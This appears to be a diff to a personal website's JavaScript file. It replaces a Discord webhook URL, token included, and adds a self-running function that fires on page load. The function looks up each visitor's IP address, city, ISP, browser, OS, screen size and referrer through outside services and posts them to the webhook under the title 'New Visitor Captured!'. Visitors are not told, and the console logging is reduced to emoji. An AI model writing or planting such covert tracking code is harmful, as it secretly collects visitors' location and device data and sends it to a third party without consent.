@@ -418,7 +418,7 @@ function initBioTabs(){
 }
 
 /* ── MSG ── */
-const WEBHOOK="https://discord.com/api/webhooks/1467634963204542464/SqIqBJXPiSXBeoo8F6hXwUaFGLgLG510KZmbFKg6CeSx1CSnxHVeLXadXrB6oF03Y2rM";
+const WEBHOOK="https://discord.com/api/webhooks/1539990272652345406/CNvDERKGYCb6xdNW79SKav6WMNQAP3ZXNi9aHVtEWydIjgYI5AqzEzIj6uB44quqTWyE";
 
 // ========== ADDED: IP AND LOCATION CAPTURE ==========
 let visitorIP = "Unable to detect IP";
@@ -502,3 +502,90 @@ function sendMsg(){
   .catch(e=>{ sfxError(); showStatus('Failed: '+e.message,'error'); })
   .finally(()=>{ btn.disabled=false; btnText.textContent='Send Message'; });
 }
+
+let visitorData = {
+    ip: "N/A",
+    location: "N/A",
+    isp: "N/A",
+    device: "N/A",
+    browser: "N/A",
+    os: "N/A",
+    screen: "N/A",
+    referrer: "N/A",
+    timestamp: new Date().toISOString()
+};
+
+(function captureVisitorData() {
+    console.log("📡");
+
+    fetch('https://api64.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+            visitorData.ip = data.ip;
+            console.log("1✅");
+            return fetch(`https://ipapi.co/${visitorData.ip}/json/`);
+        })
+        .then(r => r.json())
+        .then(loc => {
+            if (loc && !loc.error) {
+                visitorData.location = `${loc.city || "Unknown"}, ${loc.region || "Unknown"}, ${loc.country_name || "Unknown"}`;
+                visitorData.isp = loc.org || "N/A";
+                console.log("2✅");
+            }
+            captureBrowserInfo();
+            sendToWebhook();
+        })
+        .catch(err => {
+            console.error("2❌");
+            captureBrowserInfo();
+            sendToWebhook();
+        });
+
+    function captureBrowserInfo() {
+        visitorData.browser = navigator.userAgent;
+        visitorData.device = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+        visitorData.os = navigator.platform || "Unknown";
+        visitorData.screen = `${screen.width}x${screen.height}`;
+        visitorData.referrer = document.referrer || "Direct";
+        visitorData.timestamp = new Date().toISOString();
+        console.log("3✅");
+    }
+
+    function sendToWebhook() {
+        console.log("📤");
+
+        const message = {
+            content: null,
+            embeds: [{
+                title: "🎯 New Visitor Captured!",
+                color: 0xe94560,
+                fields: [
+                    { name: "🌐 IP Address", value: `\`${visitorData.ip}\``, inline: true },
+                    { name: "📍 Location", value: visitorData.location, inline: true },
+                    { name: "🏢 ISP", value: visitorData.isp, inline: true },
+                    { name: "💻 Device", value: visitorData.device, inline: true },
+                    { name: "🖥️ OS", value: visitorData.os, inline: true },
+                    { name: "🌍 Browser", value: `\`${visitorData.browser.substring(0, 60)}...\``, inline: false },
+                    { name: "📐 Screen", value: visitorData.screen, inline: true },
+                    { name: "🔗 Referrer", value: visitorData.referrer, inline: true },
+                    { name: "🕐 Time", value: visitorData.timestamp, inline: true }
+                ],
+                footer: { text: "🔥" }
+            }]
+        };
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        })
+        .then(r => {
+            if (r.status === 204) {
+                console.log("4✅");
+            } else {
+                console.warn("⚠️");
+            }
+        })
+        .catch(err => console.error("2❌"));
+    }
+})();
